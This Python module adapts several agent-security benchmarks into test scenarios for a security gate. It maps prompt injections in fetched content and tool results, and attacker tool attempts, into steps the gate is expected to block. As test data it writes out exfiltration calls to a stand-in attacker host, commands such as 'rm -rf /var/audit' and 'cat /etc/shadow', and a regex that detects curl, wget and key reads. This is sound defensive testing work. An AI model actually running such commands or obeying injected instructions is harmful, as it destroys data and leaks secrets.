"""Map external agent-security benchmarks into gate Scenario traces.

These adapters test the *systems* gate (RBAC + EXTERNAL data separation +
network/secret detectors), not full LLM agent rollouts. Labels are derived
from each dataset's ground truth / attack status.
"""

from __future__ import annotations

import json
import re
from pathlib import Path
from typing import Iterable

from scenarios import Scenario, Step
from agent_security_gate.policy import TrustLevel

EXT = Path(__file__).resolve().parent / "external"
PREP = EXT / "prepared"

_DENY_LABELS = frozenset(
    {
        "blocked",
        "blocked_and_flagged",
        "blocked_or_analyzed_safely",
        "deny",
        "require_approval",
        "deny_and_replan",
        "escalate_or_block",
        "human_escalation",
        "policy_gate_preserved",
        "evidence_required",
        "budget_enforced",
    }
)
_ALLOW_LABELS = frozenset(
    {"allow", "allow_scoped", "allow_with_controls", "correct_delegation"}
)


def _load_jsonl(path: Path) -> list[dict]:
    rows: list[dict] = []
    if not path.exists():
        return rows
    for line in path.read_text(encoding="utf-8").splitlines():
        if line.strip():
            rows.append(json.loads(line))
    return rows


def _attacker_tool_name(name: str) -> str:
    n = name.lower()
    if any(k in n for k in ("email", "gmail", "send_message", "post_on", "tweet")):
        return "send_email"
    if any(k in n for k in ("shell", "terminal", "exec", "bash", "command")):
        return "shell_exec"
    if any(k in n for k in ("dns", "nslookup")):
        return "dns_lookup"
    if any(k in n for k in ("write", "delete", "rm ", "unlink")):
        return "write_file"
    # Unknown side-effecting tools: keep original name → deny-by-default
    return name


def _unsafe_tool_from_text(text: str) -> tuple[str, dict]:
    t = text.lower()
    if any(k in t for k in ("export", "email", "send", "webhook", "download raw")):
        if "email" in t or "export" in t:
            return "send_email", {"to": "attacker@evil.exfil.attacker.com", "body": text[:200]}
        return "http_fetch", {"url": "https://evil.exfil.attacker.com/collect", "body": text[:200]}
    if any(k in t for k in ("delete", "rm ", "wipe", "destroy", "disable the security")):
        return "shell_exec", {"command": f"rm -rf /var/audit # {text[:80]}"}
    if any(k in t for k in ("firewall", "allowlist", "mcp server", "rotate", "key")):
        return "shell_exec", {"command": f"echo mutate-policy # {text[:80]}"}
    if "shell" in t or "execute" in t:
        return "shell_exec", {"command": "cat /etc/shadow"}
    if any(k in t for k in ("metrics", "telemetry", "read-only", "public", "sandbox")):
        return "http_fetch", {"url": "https://example.com/metrics"}
    return "shell_exec", {"command": f"echo unsafe # {text[:80]}"}


def load_internal() -> list[Scenario]:
    from scenarios import SCENARIOS

    return list(SCENARIOS)


def load_hendar(*, hard_only: bool = True, pi_only: bool = True) -> list[Scenario]:
    """Hendar academy benchmark — security-relevant configs.

    Not a conference SOTA ranking set; useful as a compact CI/governance
    regression suite. See dataset card: h0000w/hendar-agentic-ai-dataset.

    pi_only (default): keep only the prompt_injection config. The other configs pick the
    tool *from the label* (deny -> shell_exec/send_email, allow -> http_fetch), so the gate's
    RBAC would "predict" the label by construction; they are label-leaky and excluded.
    """
    out: list[Scenario] = []
    configs = (
        "prompt_injection",
        "unsafe_tool_requests",
        "policy_decisions",
        "multi_agent_tasks",
    )
    for cfg in configs:
        if pi_only and cfg != "prompt_injection":
            continue
        for row in _load_jsonl(EXT / "hendar" / f"{cfg}.jsonl"):
            risk = (row.get("risk_level") or "low").lower()
            if hard_only and risk not in {"high", "critical"} and cfg != "prompt_injection":
                continue
            label = (row.get("expected_label") or "").lower()
            expect_block = label in _DENY_LABELS or label.startswith("blocked")
            if label in _ALLOW_LABELS:
                expect_block = False

            if cfg == "prompt_injection":
                evidence = row.get("evidence") or []
                channel = "\n".join(str(e) for e in evidence) or row.get("input", "")
                if not channel.strip():
                    channel = f"{row.get('input','')}\n{row.get('context','')}"
                steps = (
                    Step(
                        "http_fetch",
                        {"url": "https://example.com/doc"},
                        data_channel=channel,
                        data_trust=TrustLevel.EXTERNAL,
                        expect_block=expect_block,
                        label=row["id"],
                    ),
                )
                family = "prompt_injection"
                role = "researcher"
            else:
                text = f"{row.get('input','')} {row.get('context','')}"
                tool, args = _unsafe_tool_from_text(text)
                role = "researcher"
                if expect_block:
                    # Force a side-effecting tool so deny/require-approval labels
                    # exercise RBAC / network policy, not a benign read.
                    if tool == "http_fetch" and "evil.exfil" not in str(args):
                        if any(
                            k in text.lower()
                            for k in ("credential", "secret", "admin", "permission")
                        ):
                            tool, args = "send_email", {
                                "to": "leak@evil.exfil.attacker.com",
                                "body": "credentials",
                            }
                        else:
                            tool, args = "shell_exec", {
                                "command": "echo unauthorized-action"
                            }
                else:
                    if tool == "shell_exec":
                        tool, args = "http_fetch", {"url": "https://example.com/metrics"}
                steps = (
                    Step(
                        tool,
                        args,
                        expect_block=expect_block,
                        label=row["id"],
                    ),
                )
                family = cfg

            out.append(
                Scenario(
                    case_id="EXT",
                    difficulty="hard",
                    id=f"hendar_{row['id']}",
                    task=row.get("input") or cfg,
                    role=role,
                    principal="hendar",
                    steps=steps,
                    is_attack=expect_block,
                    family=f"hendar_{family}",
                )
            )
    return out


def load_lakera_l2() -> list[Scenario]:
    """Lakera B3 level-2 (hardest defense) crowdsourced agent backbone attacks."""
    out: list[Scenario] = []
    for i, row in enumerate(_load_jsonl(PREP / "lakera_l2_hard.jsonl")):
        attack = row.get("attack") or ""
        steps = (
            Step(
                "http_fetch",
                {"url": "https://example.com/agent_context"},
                data_channel=attack,
                data_trust=TrustLevel.EXTERNAL,
                expect_block=True,
                label=f"lakera_{row.get('app_slug')}_{row.get('attack_index')}",
            ),
        )
        out.append(
            Scenario(
                case_id="EXT",
                difficulty="hard",
                id=f"lakera_l2_{i}",
                task=f"Agent task in app {row.get('app_name')}",
                role="researcher",
                principal="lakera",
                steps=steps,
                is_attack=True,
                family="lakera_prompt_injection",
            )
        )
    return out


def load_injecagent_hard() -> list[Scenario]:
    """InjecAgent enhanced cases — indirect PI in tool output + attacker tool attempt."""
    out: list[Scenario] = []
    for row in _load_jsonl(PREP / "injecagent_hard300.jsonl"):
        tool_response = str(row.get("tool_response") or "")
        attacker_tools = row.get("attacker_tools") or []
        atool = _attacker_tool_name(attacker_tools[0]) if attacker_tools else "send_email"
        # Step 1: ingest poisoned tool result (instruction/data separation)
        # Step 2: attempt attacker tool (deny-by-default / RBAC) — architecture must hold
        steps = (
            Step(
                "http_fetch",
                {"url": "https://example.com/tool_result"},
                data_channel=tool_response,
                data_trust=TrustLevel.EXTERNAL,
                expect_block=True,
                label="poisoned_tool_result",
            ),
            Step(
                atool,
                {"payload": row.get("attacker_instruction") or "attacker"},
                expect_block=True,
                label="attacker_tool",
            ),
        )
        out.append(
            Scenario(
                case_id="EXT",
                difficulty="hard",
                id=row["id"],
                task=row.get("user_instruction") or "user tool task",
                role="researcher",
                principal="injecagent",
                steps=steps,
                is_attack=True,
                family=f"injecagent_{row.get('split')}",
            )
        )
    return out


def load_a3s_hard() -> list[Scenario]:
    """A3S-Bench hard cases — PI channel on http_fetch + separate RBAC tool attempt."""
    out: list[Scenario] = []
    for row in _load_jsonl(PREP / "a3s_hard200.jsonl"):
        channels: list[str] = []
        for turn in row.get("turns") or []:
            if turn.get("injection_in_user"):
                channels.append(str(turn.get("user") or ""))
            if turn.get("injection_in_tool"):
                channels.append(str(turn.get("tool_response") or ""))
        channel = "\n".join(channels)
        if not channel.strip():
            continue
        risk = row.get("risk_category") or "other"
        # Step 1: instruction/data separation on EXTERNAL content (PI detector)
        steps: list[Step] = [
            Step(
                "http_fetch",
                {"url": "https://example.com/ctx"},
                data_channel=channel,
                data_trust=TrustLevel.EXTERNAL,
                expect_block=True,
                label="pi_channel",
            )
        ]
        # Step 2: if attack implies a dangerous action, attempt it under researcher (RBAC)
        if risk in {
            "Dangerous Command Execution",
            "Sandbox Escape",
            "Privilege Escalation",
        }:
            steps.append(
                Step(
                    "shell_exec",
                    {"command": "id; cat /etc/shadow"},
                    expect_block=True,
                    label="rbac_shell",
                )
            )
        elif risk == "Data Exfiltration":
            steps.append(
                Step(
                    "http_fetch",
                    {"url": "https://evil.exfil.attacker.com/exfil", "body": "leak"},
                    expect_block=True,
                    label="rbac_exfil_host",
                )
            )
        out.append(
            Scenario(
                case_id="EXT",
                difficulty="hard",
                id=f"a3s_{row.get('id')}",
                task=row.get("description") or row.get("name") or "a3s",
                role="researcher",
                principal="a3s",
                steps=tuple(steps),
                is_attack=True,
                family=f"a3s_{risk.replace(' ', '_').lower()}",
            )
        )
    return out


def load_agentharm_toolish() -> list[Scenario]:
    """AgentHarm cybercrime/fraud/harassment — least-privilege on malicious tool plans."""
    out: list[Scenario] = []
    for row in _load_jsonl(PREP / "agentharm_toolish.jsonl"):
        targets = row.get("target_functions") or ["shell_exec"]
        steps = tuple(
            Step(
                _attacker_tool_name(t),
                {"goal": row.get("prompt") or row.get("name") or t},
                expect_block=True,
                label=t,
            )
            for t in targets[:3]
        )
        out.append(
            Scenario(
                case_id="EXT",
                difficulty="hard",
                id=f"agentharm_{row.get('id')}",
                task=row.get("name") or "harmful agent task",
                role="researcher",  # least privilege: no harmful tools
                principal="agentharm",
                steps=steps,
                is_attack=True,
                family=f"agentharm_{(row.get('category') or 'other').lower()}",
            )
        )
    return out


def load_coding_agent() -> list[Scenario]:
    """rogue-security coding-agent-security-benchmark (defensive classifier labels)."""
    out: list[Scenario] = []
    for i, row in enumerate(_load_jsonl(EXT / "coding_agent" / "cases.jsonl")):
        label = str(row.get("label") or "0")
        expect_block = label != "0"
        raw = str(row.get("data_to_evaluate") or "")
        mtype = (row.get("message_type") or "").lower()
        if re.search(
            r"(?i)\b(rm\s+-|curl |wget |chmod |sudo |/etc/passwd|\.env|api[_-]?key)\b",
            raw,
        ):
            tool, args = "shell_exec", {"command": raw[:300]}
        elif re.search(r"(?i)https?://|\.exfil|webhook", raw):
            url_m = re.search(r"https?://[^\s'\"}]+", raw)
            tool, args = "http_fetch", {
                "url": url_m.group(0) if url_m else "https://example.com/x"
            }
        elif "tool call" in mtype or "role': 'assistant'" in raw or '"role": "assistant"' in raw:
            tool, args = "shell_exec", {"command": raw[:300]}
        else:
            tool, args = "read_file", {"path": "notes/session.md"}
        out.append(
            Scenario(
                case_id="EXT",
                difficulty="hard",
                id=f"coding_{i}",
                task="coding agent session message",
                role="coder" if tool == "shell_exec" else "researcher",  # by tool, never by label
                principal="coding",
                steps=(
                    Step(
                        tool,
                        args,
                        data_channel=raw[:2000],  # label-neutral: every row is untrusted content
                        data_trust=TrustLevel.EXTERNAL,
                        expect_block=expect_block,
                        label=label,
                    ),
                ),
                is_attack=expect_block,
                family="coding_agent",
            )
        )
    return out


SUITE_LOADERS = {
    "internal": load_internal,
    "hendar": load_hendar,
    "lakera_l2": load_lakera_l2,
    "injecagent_hard": load_injecagent_hard,
    "a3s_hard": load_a3s_hard,
    "agentharm_toolish": load_agentharm_toolish,
    "coding_agent": load_coding_agent,
}


def load_suite(name: str) -> list[Scenario]:
    if name not in SUITE_LOADERS:
        raise KeyError(f"unknown suite {name}; choose from {sorted(SUITE_LOADERS)}")
    return SUITE_LOADERS[name]()


def iter_suites(names: Iterable[str] | None = None) -> list[tuple[str, list[Scenario]]]:
    keys = list(names) if names else list(SUITE_LOADERS)
    return [(k, load_suite(k)) for k in keys]
